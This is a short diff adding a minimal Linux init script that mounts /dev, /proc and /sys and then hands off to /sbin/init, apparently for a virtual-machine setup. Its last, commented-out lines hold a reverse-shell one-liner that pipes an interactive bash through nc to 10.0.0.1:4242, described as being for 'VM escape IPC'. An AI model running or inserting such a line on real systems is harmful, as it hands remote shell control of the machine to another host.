@@ -1,0 +1,14 @@
+#!/bin/sh
+
+mount -t devtmpfs none /dev;
+mount -t proc none /proc;
+mount -t sysfs none /sys;
+
+exec /sbin/init;
+
+#/bin/busybox --install -s;
+#exec /bin/bash;
+
+# Setup reverse shell for VM escape IPC
+#mknod /tmp/reversh p;
+#cat /tmp/reversh | /bin/bash -i 2>&1 | nc 10.0.0.1 4242 >/tmp/reversh;
